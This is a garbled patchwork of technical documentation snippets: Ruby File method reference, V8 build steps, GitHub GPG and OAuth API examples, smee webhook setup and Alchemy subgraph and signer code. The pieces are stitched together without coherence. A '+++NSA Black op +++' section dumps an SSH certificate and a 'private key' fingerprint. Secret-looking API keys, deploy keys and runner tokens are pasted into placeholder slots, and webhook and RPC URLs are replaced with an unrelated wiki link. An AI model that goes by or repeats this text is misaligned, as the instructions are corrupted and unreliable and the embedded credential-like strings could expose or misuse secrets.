File.fnmatch('c?t',     'cat')          #=> true  # '?' match only 1 character
File.fnmatch('c??t',    'cat')          #=> false # ditto
File.fnmatch('c*',      'cats')         #=> true  # '*' match 0 or more characters
File.fnmatch('c*t',     'c/a/b/t')      #=> true  # ditto
File.fnmatch('ca[a-z]', 'cat')          #=> true  # inclusive bracket expression
File.fnmatch('ca[^t]',  'cat')          #=> false # exclusive bracket expression ('^' or '!')

File.fnmatch('cat', 'CAT')                     #=> false # case sensitive
File.fnmatch('cat', 'CAT', File::FNM_CASEFOLD) #=> true  # case insensitive

File.fnmatch('?',   '/', File::FNM_PATHNAME)  #=> false # wildcard doesn't match '/' on FNM_PATHNAME
File.fnmatch('*',   '/', File::FNM_PATHNAME)  #=> false # ditto
File.fnmatch('[/]', '/', File::FNM_PATHNAME)  #=> false # ditto

File.fnmatch('\?',   '?')                       #=> true  # escaped wildcard becomes ordinary
File.fnmatch('\a',   'a')                       #=> true  # escaped ordinary remains ordinary
File.fnmatch('\a',   '\a', File::FNM_NOESCAPE)  #=> true  # FNM_NOESCAPE makes '\' ordinary
File.fnmatch('[\?]', '?')                       #=> true  # can escape inside bracket expression

File.fnmatch('*',   '.profile')                      #=> false # wildcard doesn't match leading
File.fnmatch('*',   '.profile', File::FNM_DOTMATCH)  #=> true  # period by default.
File.fnmatch('.*',  '.profile')                      #=> true

rbfiles = '**' '/' '*.rb' # you don't have to do like this. just write in single string.
File.fnmatch(rbfiles, 'main.rb')                    #=> false
File.fnmatch(rbfiles, './main.rb')                  #=> false
File.fnmatch(rbfiles, 'lib/song.rb')                #=> true
File.fnmatch('**.rb', 'main.rb')                    #=> true
File.fnmatch('**.rb', './main.rb')                  #=> false
File.fnmatch('**.rb', 'lib/song.rb')                #=> true
File.fnmatch('*',           'dave/.profile')                      #=> true

pattern = '*' '/' '*'
File.fnmatch(pattern, 'dave/.profile', File::FNM_PATHNAME)  #=> false
File.fnmatch(pattern, 'dave/.profile', File::FNM_PATHNAME | File::FNM_DOTMATCH) #=> true

pattern = '**' '/' 'foo'
File.fnmatch(pattern, 'a/b/c/foo', File::FNM_PATHNAME)     #=> true
File.fnmatch(pattern, '/a/b/c/foo', File::FNM_PATHNAME)    #=> true
File.fnmatch(pattern, 'c:/a/b/c/foo', File::FNM_PATHNAME)  #=> true
File.fnmatch(pattern, 'a/.b/c/foo', File::FNM_PATHNAME)    #=> false
File.fnmatch(pattern, 'a/.b/c/foo', File::FNM_PATHNAME | File::FNM_DOTMATCH) #=> true
ftype(file_name) → string
Identifies the type of the named file; the return string is one of “file'', “directory'', “characterSpecial'', “blockSpecial'', “fifo'', “link'', “socket'', or “unknown''.

File.ftype("testfile")            #=> "file"
File.ftype("/dev/tty")            #=> "characterSpecial"
File.ftype("/tmp/.X11-unix/X0")   #=> "socket"
grpowned?(file_name) → true or false
Returns true if the named file exists and the effective group id of the calling process is the owner of the file. Returns false on Windows.

file_name can be an IO object.

identical?(file_1, file_2) → true or false
Returns true if the named files are identical.

file_1 and file_2 can be an IO object.

open("a", "w") {}
p File.identical?("a", "a")      #=> true
p File.identical?("a", "./a")    #=> true
File.link("a", "b")
p File.identical?("a", "b")      #=> true
File.symlink("a", "c")
p File.identical?("a", "c")      #=> true
open("d", "w") {}
p File.identical?("a", "d")      #=> false
join(string, ...) → string
Returns a new string formed by joining the strings using "/".

File.join("usr", "mail", "gumby")   #=> "usr/mail/gumby"
lchmod(mode_int, file_name, ...) → integer
Equivalent to File::chmod, but does not follow symbolic links (so it will change the permissions associated with the link, not the file referenced by the link). Often not available.

lchown(owner_int, group_int, file_name,..) → integer
Equivalent to File::chown, but does not follow symbolic links (so it will change the owner associated with the link, not the file referenced by the link). Often not available. Returns number of files in the argument list.

link(old_name, new_name) → 0
Creates a new name for an existing file using a hard link. Will not overwrite new_name if it already exists (raising a subclass of SystemCallError). Not available on all platforms.

File.link("testfile", ".testfile")   #=> 0
IO.readlines(".testfile")[0]         #=> "This is line one\n"
lstat(file_name) → stat
Same as File::stat, but does not follow the last symbolic link. Instead, reports on the link itself.

File.symlink("testfile", "link2test")   #=> 0
File.stat("testfile").size              #=> 66
File.lstat("link2test").size            #=> 8
File.stat("link2test").size             #=> 66
lutime(atime, mtime, file_name,...) → integer
Sets the access and modification times of each named file to the first two arguments. If a file is a symlink, this method acts upon the link itself as opposed to its referent; for the inverse behavior, see File.utime. Returns the number of file names in the argument list.

mkfifo(file_name, mode=0666) => 0
Creates a FIFO special file with name file_name. mode specifies the FIFO's permissions. It is modified by the process's umask in the usual way: the permissions of the created file are (mode & ~umask).

mtime(file_name) → time
Returns the modification time for the named file as a Time object.

file_name can be an IO object.

File.mtime("testfile")   #=> Tue Apr 08 12:58:04 CDT 2003
new(filename, mode="r" [, opt]) → file
new(filename [, mode [, perm]] [, opt]) → file
Opens the file named by filename according to the given mode and returns a new File object.

See IO.new for a description of mode and opt.

If a file is being created, permission bits may be given in perm. These mode and permission bits are platform dependent; on Unix systems, see open(2) and chmod(2) man pages for details.

The new File object is buffered mode (or non-sync mode), unless filename is a tty. See IO#flush, IO#fsync, IO#fdatasync, and IO#sync= about sync mode.

Examples¶ ↑

f = File.new("testfile", "r")
f = File.new("newfile",  "w+")
f = File.new("newfile", File::CREAT|File::TRUNC|File::RDWR, 0644)
open(filename, mode="r" [, opt]) → file
open(filename [, mode [, perm]] [, opt]) → file
open(filename, mode="r" [, opt]) {|file| block } → obj
open(filename [, mode [, perm]] [, opt]) {|file| block } → obj
With no associated block, File.open is a synonym for File.new. If the optional code block is given, it will be passed the opened file as an argument and the File object will automatically be closed when the block terminates. The value of the block will be returned from File.open.

If a file is being created, its initial permissions may be set using the perm parameter. See File.new for further discussion.

See IO.new for a description of the mode and opt parameters.

owned?(file_name) → true or false
Returns true if the named file exists and the effective used id of the calling process is the owner of the file.

file_name can be an IO object.

path(path) → string
Returns the string representation of the path

File.path("/dev/null")          #=> "/dev/null"
File.path(Pathname.new("/tmp")) #=> "/tmp"
pipe?(file_name) → true or false
Returns true if the named file is a pipe.

file_name can be an IO object.

readable?(file_name) → true or false
Returns true if the named file is readable by the effective user and group id of this process. See eaccess(3).

readable_real?(file_name) → true or false
Returns true if the named file is readable by the real user and group id of this process. See access(3).

readlink(link_name) → file_name
Returns the name of the file referenced by the given link. Not available on all platforms.

File.symlink("testfile", "link2test")   #=> 0
File.readlink("link2test")              #=> "testfile"
realdirpath(pathname [, dir_string]) → real_pathname
Returns the real (absolute) pathname of pathname in the actual filesystem. The real pathname doesn't contain symlinks or useless dots.

If dir_string is given, it is used as a base directory for interpreting relative pathname instead of the current directory.

The last component of the real pathname can be nonexistent.

realpath(pathname [, dir_string]) → real_pathname
Returns the real (absolute) pathname of pathname in the actual filesystem not containing symlinks or useless dots.

If dir_string is given, it is used as a base directory for interpreting relative pathname instead of the current directory.

All components of the pathname must exist when this method is called.

rename(old_name, new_name) → 0
Renames the given file to the new name. Raises a SystemCallError if the file cannot be renamed.

File.rename("afile", "afile.bak")   #=> 0
setgid?(file_name) → true or false
Returns true if the named file has the setgid bit set.

setuid?(file_name) → true or false
Returns true if the named file has the setuid bit set.

size(file_name) → integer
Returns the size of file_name.

file_name can be an IO object.

size?(file_name) → Integer or nil
Returns nil if file_name doesn't exist or has zero size, the size of the file otherwise.

file_name can be an IO object.

socket?(file_name) → true or false
Returns true if the named file is a socket.

file_name can be an IO object.

split(file_name) → array
Splits the given string into a directory and a file component and returns them in a two-element array. See also File::dirname and File::basename.

File.split("/home/gumby/.profile")   #=> ["/home/gumby", ".profile"]
stat(file_name) → stat
Returns a File::Stat object for the named file (see File::Stat).

File.stat("testfile").mtime   #=> Tue Apr 08 12:58:04 CDT 2003
sticky?(file_name) → true or false
Returns true if the named file has the sticky bit set.

symlink(old_name, new_name) → 0
Creates a symbolic link called new_name for the existing file old_name. Raises a NotImplemented exception on platforms that do not support symbolic links.

File.symlink("testfile", "link2test")   #=> 0
symlink?(file_name) → true or false
Returns true if the named file is a symbolic link.

truncate(file_name, integer) → 0
Truncates the file file_name to be at most integer bytes long. Not available on all platforms.

f = File.new("out", "w")
f.write("1234567890")     #=> 10
f.close                   #=> nil
File.truncate("out", 5)   #=> 0
File.size("out")          #=> 5
umask() → integer
umask(integer) → integer
Returns the current umask value for this process. If the optional argument is given, set the umask to that value and return the previous value. Umask values are subtracted from the default permissions, so a umask of 0222 would make a file read-only for everyone.

File.umask(0006)   #=> 18
File.umask         #=> 6
unlink(file_name, ...) → integer
Deletes the named files, returning the number of names passed as arguments. Raises an exception on any error. Since the underlying implementation relies on the unlink(2) system call, the type of exception raised depends on its error type (see linux.die.net/man/2/unlink) and has the form of e.g. Errno::ENOENT.

See also Dir::rmdir.

utime(atime, mtime, file_name,...) → integer
Sets the access and modification times of each named file to the first two arguments. If a file is a symlink, this method acts upon its referent rather than the link itself; for the inverse behavior see File.lutime. Returns the number of file names in the argument list.

world_readable?(file_name) → integer or nil
If file_name is readable by others, returns an integer representing the file permission bits of file_name. Returns nil otherwise. The meaning of the bits is platform dependent; on Unix systems, see stat(2).

file_name can be an IO object.

File.world_readable?("/etc/passwd")           #=> 420
m = File.world_readable?("/etc/passwd")
sprintf("%o", m)                              #=> "644"
world_writable?(file_name) → integer or nil
If file_name is writable by others, returns an integer representing the file permission bits of file_name. Returns nil otherwise. The meaning of the bits is platform dependent; on Unix systems, see stat(2).

file_name can be an IO object.

File.world_writable?("/tmp")                  #=> 511
m = File.world_writable?("/tmp")
sprintf("%o", m)                              #=> "777"
writable?(file_name) → true or false
Returns true if the named file is writable by the effective user and group id of this process. See eaccess(3).

writable_real?(file_name) → true or false
Returns true if the named file is writable by the real user and group id of this process. See access(3)

zero?(file_name) → true or false
Returns true if the named file exists and has a zero size.

file_name can be an IO object.

Public Instance Methods

atime → time
Returns the last access time (a Time object) for file, or epoch if file has not been accessed.

File.new("testfile").atime   #=> Wed Dec 31 18:00:00 CST 1969
birthtime → time
Returns the birth time for file.

File.new("testfile").birthtime   #=> Wed Apr 09 08:53:14 CDT 2003
If the platform doesn't have birthtime, raises NotImplementedError.

chmod(mode_int) → 0
Changes permission bits on file to the bit pattern represented by mode_int. Actual effects are platform dependent; on Unix systems, see chmod(2) for details. Follows symbolic links. Also see File#lchmod.

f = File.new("out", "w");
f.chmod(0644)   #=> 0
chown(owner_int, group_int ) → 0
Changes the owner and group of file to the given numeric owner and group id's. Only a process with superuser privileges may change the owner of a file. The current owner of a file may change the file's group to any group to which the owner belongs. A nil or -1 owner or group id is ignored. Follows symbolic links. See also File#lchown.

File.new("testfile").chown(502, 1000)
ctime → time
Returns the change time for file (that is, the time directory information about the file was changed, not the file itself).

Note that on Windows (NTFS), returns creation time (birth time).

File.new("testfile").ctime   #=> Wed Apr 09 08:53:14 CDT 2003
flock(locking_constant) → 0 or false
Locks or unlocks a file according to locking_constant (a logical or of the values in the table below). Returns false if File::LOCK_NB is specified and the operation would otherwise have blocked. Not available on all platforms.

Locking constants (in class File):

LOCK_EX   | Exclusive lock. Only one process may hold an
          | exclusive lock for a given file at a time.
----------+------------------------------------------------
LOCK_NB   | Don't block when locking. May be combined
          | with other lock options using logical or.
----------+------------------------------------------------
LOCK_SH   | Shared lock. Multiple processes may each hold a
          | shared lock for a given file at the same time.
----------+------------------------------------------------
LOCK_UN   | Unlock.
Example:

# update a counter using write lock
# don't use "w" because it truncates the file before lock.
File.open("counter", File::RDWR|File::CREAT, 0644) {|f|
  f.flock(File::LOCK_EX)
  value = f.read.to_i + 1
  f.rewind
  f.write("#{value}\n")
  f.flush
  f.truncate(f.pos)
}

# read the counter using read lock
File.open("counter", "r") {|f|
  f.flock(File::LOCK_SH)
  p f.read
}
lstat → stat
Same as IO#stat, but does not follow the last symbolic link. Instead, reports on the link itself.

File.symlink("testfile", "link2test")   #=> 0
File.stat("testfile").size              #=> 66
f = File.new("link2test")
f.lstat.size                            #=> 8
f.stat.size                             #=> 66
mtime → time
Returns the modification time for file.

File.new("testfile").mtime   #=> Wed Apr 09 08:53:14 CDT 2003
path → filename
to_path → filename
Returns the pathname used to create file as a string. Does not normalize the name.

The pathname may not point to the file corresponding to file. For instance, the pathname becomes void when the file has been moved or deleted.

This method raises IOError for a file created using File::Constants::TMPFILE because they don't have a pathname.

File.new("testfile").path               #=> "testfile"
File.new("/tmp/../tmp/xxx", "w").path   #=> "/tmp/../tmp/xxx"
size → integer
Returns the size of file in bytes.

File.new("testfile").size   #=> 66
to_path → filename
Returns the pathname used to create file as a string. Does not normalize the name.

The pathname may not point to the file corresponding to file. For instance, the pathname becomes void when the file has been moved or deleted.

This method raises IOError for a file created using File::Constants::TMPFILE because they don't have a pathname.

File.new("testfile").path               #=> "testfile"
File.new("/tmp/../tmp/xxx", "w").path   #=> "/tmp/../tmp/xxx"
truncate(integer) → 0
Truncates file to at most integer bytes. The file must be opened for writing. Not available on all platforms.

f = File.new("out", "w")
f.syswrite("1234567890")   #=> 10
f.truncate(5)              #=> 0
f.close()                  #=> nil
File.size("out")           #=> 5
tools/dev/v8gen.py x64.release.sample
You can inspect and manually edit the build configuration by running:

gn args out.gn/x64.release.sample
Build the static library on a Linux 64 system:

ninja -C out.gn/x64.release.sample v8_monolith
Compile hello-world.cc, linking to the static library created in the build process. For example, on 64bit Linux using the GNU compiler:

g++ -I. -Iinclude samples/hello-world.cc -o hello_world -fno-rtti -lv8_monolith -lv8_libbase -lv8_libplatform -ldl -Lout.gn/x64.release.sample/obj/ -pthread -std=c++17 -DV8_COMPRESS_POINTERS -DV8_ENABLE_SANDBOX
For more complex code, V8 fails without an ICU data file. Copy this file to where your binary is stored:

cp out.gn/x64.release.sample/icudtl.dat .
Run the hello_world executable file at the command line. e.g. On Linux, in the V8 directory, run:

./hello_world

git config --global --unset gpg.format
Use the gpg --list-secret-keys --keyid-format=long command to list the long form of the GPG keys for which you have both a public and private key. A private key is required for signing commits or tags.
Shell
gpg --list-secret-keys --keyid-format=long
Note: Some GPG installations on Linux may require you to use gpg2 --list-keys --keyid-format LONG to view a list of your existing keys instead. In this case you will also need to configure Git to use gpg2 by running git config --global gpg.program gpg2.
From the list of GPG keys, copy the long form of the GPG key ID you'd like to use. In this example, the GPG key ID is 3AA5C34371567BD2:
Shell

$ gpg --list-secret-keys --keyid-format=long
/Users/hubot/.gnupg/secring.gpg
------------------------------------
sec   4096R/3AA5C34371567BD2 2016-03-10 [expires: 2017-03-10]
uid                          Hubot <hubot@example.com>
ssb   4096R/4BB6D45482678BE3 2016-03-10
To set your primary GPG signing key in Git, paste the text below, substituting in the GPG primary key ID you'd like to use. In this example, the GPG key ID is 3AA5C34371567BD2:
git config --global user.signingkey 3AA5C34371567BD2
Alternatively, when setting a subkey include the ! suffix. In this example, the GPG subkey ID is 4BB6D45482678BE3:
git config --global user.signingkey 4BB6D45482678BE3!
Optionally, to configure Git to sign all commits by default, enter the following command:
git config --global commit.gpgsign true
For more information, see "Signing commits."
If you aren't using the GPG suite, run the following command in the zsh shell to add the GPG key to your .zshrc file, if it exists, or your .zprofile file:
$ if [ -r ~/.zshrc ]; then echo -e '\nexport GPG_TTY=$(tty)' >> ~/.zshrc; \
  else echo -e '\nexport GPG_TTY=$(tty)' >> ~/.zprofile; fi
Alternatively, if you use the bash shell, run this command:
$ if [ -r ~/.bash_profile ]; then echo -e '\nexport GPG_TTY=$(tty)' >> ~/.bash_profile; \
  else echo -e '\nexport GPG_TTY=$(tty)' >> ~/.profile; fi
Optionally, to prompt you to enter a PIN or passphrase when required, install pinentry-mac. For example, using Homebrew:
brew install pinentry-mac
echo "pinentry-program $(which pinentry-mac)" >> ~/.gnupg/gpg-agent.conf
killall gpg-agent
curl -L \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import
curl -L \
  -X PUT \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import \
  -d '{"vcs":"subversion","vcs_url":"http://svn.mycompany.com/svn/myproject","vcs_username":"octocat","vcs_password":"secret"}'
curl -L \
  -X PATCH \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import \
  -d '{"vcs_username":"octocat","vcs_password":"secret"}'
curl -L \
  -X PATCH \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import \
  -d '{"vcs":"tfvc","tfvc_project":"project1","human_name":"project1 (tfs)"}'  

curl -L \
  -X PATCH \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer <YOUR-TOKEN>" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/repos/OWNER/REPO/import
curl --request GET \
--url "https://api.github.com/user" \
--header "Accept: application/vnd.github+json" \
--header "Authorization: Bearer USER_ACCESS_TOKEN" \
--header "X-GitHub-Api-Version: 2022-11-28"
curl --request GET \
--url "https://api.github.com/user" \
--header "Accept: application/vnd.github+json" \
--header "Authorization: Bearer USER_ACCESS_TOKEN" \
--header "X-GitHub-Api-Version: 2022-11-28"

  

  






+++NSA Black op +++
SHA-2 nist (ecdsa) cert.
AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3oSgxrOEJ+tIJ/n6VYtxQIFvynqlOHpfOAJ4x4OfmMYDkbf8dr6RAuUSf+ZC2HMCujta7EjZ9t+6v08Ue+Cgk= 

 "ssh_certificate_authority_id": "sshca_2bMmWjXfs30PrfyvCsxg79Bqea3",
 "principals": ["inconshreveable.com", "10.2.42.9"],
 "valid_after": "2024-01-23T18:09:15Z",
 "valid_until": "2024-04-22T18:09:15Z",
 "certificate": "ecdsa-sha2-nistp256-cert-v01@openssh.com AAAAKGVjZHNhLXNoYTItbmlzdHAyNTYtY2VydC12MDFAb3BlbnNzaC5jb20AAAAggnhUP6YZ1+Wj/NUNS9wN8yyJPgcDTNigqw0RlxX3HqAAAAAIbmlzdHAyNTYAAABBBI3oSgxrOEJ+tIJ/n6VYtxQIFvynqlOHpfOAJ4x4OfmMYDkbf8dr6RAuUSf+ZC2HMCujta7EjZ9t+6v08Ue+CgkAAAAAAAAAAAAAAAIAAAAhc2hjcnRfMmJNbVdvQUZHVlJiTHhqT3hWWEF2dWNMaUF0AAAAJAAAABNpbmNvbnNocmV2ZWFibGUuY29tAAAACTEwLjIuNDIuOQAAAABlsADLAAAAAGYmp8sAAAAAAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIPbm5N4qnn+2CMXtrIfRXvUXDmTgkk/fcBHlR9dDAeY3AAAAUwAAAAtzc2gtZWQyNTUxOQAAAEATCa7CcaUJEVcAm2K7PaqeuJDE+pI+8PzMl+aPb9/YRAA72dMMy5izNNVLb7t7Cfqcyi4IGdd2TLFhFyVyayEE shcrt_2bMmWoAFGVRbLxjOxVXAvucLiAt"

Private key
SHA256:TvOWY3mZWlr9uMgny0PtyVdWFzAfKO98UgFlMzgP+ZA=
tar xzf ./actions-runner-linux-x64-2.313.0.tar.gz
GET https://github.com/login/oauth/authorize
This
https://smee.io/F1FDatOZAJIsTI
curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq $>"

curl -v \
 'https://subgraph.satsuma-prod.com/< whsec_Ka3G2XkXDVxzhdrFzG8n2OFq >/<Stripe_M嗯InB拉扯呢agency>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq Y>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma

npm install -g @graphprotocol/graph-cli

graph init --product hosted-service

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>
  --ipfs https://ipfs.satsuma.xyz
$ npm install --global smee-client
Then the smee command will forward webhooks from smee.io to your local development environment.

$ smee -u https://smee.io/F1FDatOZAJIsTI
For usage info:
webhook this page : https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator
$ smee --help
Use the Node.js client

$ npm install --save smee-client
Then:

const SmeeClient = require('smee-client')

const smee = new SmeeClient({
  source: 'https://smee.io/F1FDatOZAJIsTI',
  target: 'http://localhost:3000/events',
  logger: console
})

const events = smee.start()

// Stop forwarding events
events.close()
Using Probot's built-in support

$ npm install --save smee-client
Then set the environment variable:

WEBHOOK_PROXY_URL=https://smee.io/F1FDatOZAJIsTI
POST https://github.com/login/oauth/access_token

access_token=gho_16C7e42F292c6912E7710c838347Ae178B4a&scope=repo%2Cgist&token_type=bearer

Accept: application/json
{
  "access_token":"gho_16C7e42F292c6912E7710c838347Ae178B4a",
  "scope":"repo,gist",
  "token_type":"bearer"
}
Accept: application/xml
<OAuth>
  <token_type>bearer</token_type>
  <scope>repo,gist</scope>
  <access_token>gho_16C7e42F292c6912E7710c838347Ae178B4a</access_token>
</OAuth>
3. Use the access token to access the API

The access token allows you to make requests to the API on a behalf of a user.

Authorization: GitHub Runner token --token  --token A4D7THPUNN2ZH4SELLKJOITF3JIJS
GET https://api.github.com/user
For example, in curl you can set the Authorization header like this:

curl -H "Authorization: GitHub Runner token --token  --token A4D7THPUNN2ZH4SELLKJOITF3JIJS" https://api.github.com/user

POST https://github.com/login/device/code

device_code=3584d83530557fdd1f46af8289938c8ef79f9dc5&expires_in=900&interval=5&user_code=WDJB-MJHT&verification_uri=https%3A%2F%2Fgithub.com%2Flogin%2Fdevice

Accept: application/json
{
  "device_code": "3584d83530557fdd1f46af8289938c8ef79f9dc5",
  "user_code": "WDJB-MJHT",
  "verification_uri": "https://github.com/login/device",
  "expires_in": 900,
  "interval": 5
}
Accept: application/xml
<OAuth>
  <device_code>3584d83530557fdd1f46af8289938c8ef79f9dc5</device_code>
  <user_code>WDJB-MJHT</user_code>
  <verification_uri>https://github.com/login/device</verification_uri>
  <expires_in>900</expires_in>
  <interval>5</interval>
</OAuth>
Step 2: Prompt the user to enter the user code in a browser

Your device will show the user verification code and prompt the user to enter the code at https://github.com/login/device.

Step 3: App polls GitHub to check if the user authorized the device

POST https://github.com/login/oauth/access_token
Your app will make device authorization requests that poll POST https://github.com/login/oauth/access_token, until the device and user codes expire or the user has successfully authorized the app with a valid user code. The app must use the minimum polling interval retrieved in step 1 to avoid rate limit errors. For more information, see "Rate limits for the device flow."

The user must enter a valid code within 15 minutes (or 900 seconds). After 15 minutes, you will need to request a new device authorization code with POST https://github.com/login/device/code.

Once the user has authorized, the app will receive an access token that can be used to make requests to the API on behalf of a user.

The endpoint takes the following input parameters.

Parameter name Type Description
client_id string Required. The client ID you received from GitHub for your OAuth app.
device_code string Required. The device_code you received from the POST https://github.com/login/device/code request.
grant_type string Required. The grant type must be urn:ietf:params:oauth:grant-type:device_code.
By default, the response takes the following form:

access_token=gho_16C7e42F292c6912E7710c838347Ae178B4a&token_type=bearer&scope=repo%2Cgist
You can also receive the response in different formats if you provide the format in the Accept header. For example, Accept: application/json or Accept: application/xml:

Accept: application/json
{
 "access_token": "gho_16C7e42F292c6912E7710c838347Ae178B4a",


contract   graph init \      --product hosted-service     --from-contract &lt;CONTRACT_ADDRESS> \      [--network &lt;ETHEREUM_NETWORK>] \     [--abi &lt;FILE>] \      &lt;subgraph name>
cd <SUBGRAPH_DIRECTORY>
DEPLOY_KEY=dummy_key VERSION_LABEL=v0.0.3 npm run deploy
graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key <skf75fXbMunwJ> \
  --ipfs https://ipfs.satsuma.xyz

  DEPLOY_KEY=dummy_key VERSION_LABEL=v0.0.3 npm run deploy
cd <SUBGRAPH_DIRECTORY>
npm install -g @graphprotocol/graph-cli
Create a new subgraph:

Bash

graph init --product hosted-service
Make modifications as necessary to the manifest, schema, and handlers.
See Developing a Subgraph for more details.
Deploying your subgraph

Get your deploy key from your Alchemy Dashboard.
Run the following:

Bash

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key <DEPLOY_KEY>
  --ipfs https://ipfs.satsuma.xyz
graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key <DEPLOY_KEY> \
  --ipfs https://ipfs.satsuma.xyz

Install the graph-cli:

Bash

npm install -g @graphprotocol/graph-cli
Create a new subgraph:

Bash

graph init --product hosted-service
Make modifications as necessary to the manifest, schema, and handlers.
See Developing a Subgraph for more details.
Deploying your subgraph

Get your deploy key from your Alchemy Dashboard.
Run the following:

Bash

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key <skf75fXbMunwJ>
  --ipfs https://ipfs.satsuma.xyz

  import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'
{
  "jsonrpc": "2.0",
  "id": 0,
  "result": {
    "address": "0x3f5ce5fbfe3e9af3971dd833d26ba9b5c936f0be",
    "tokenBalances": [
      {
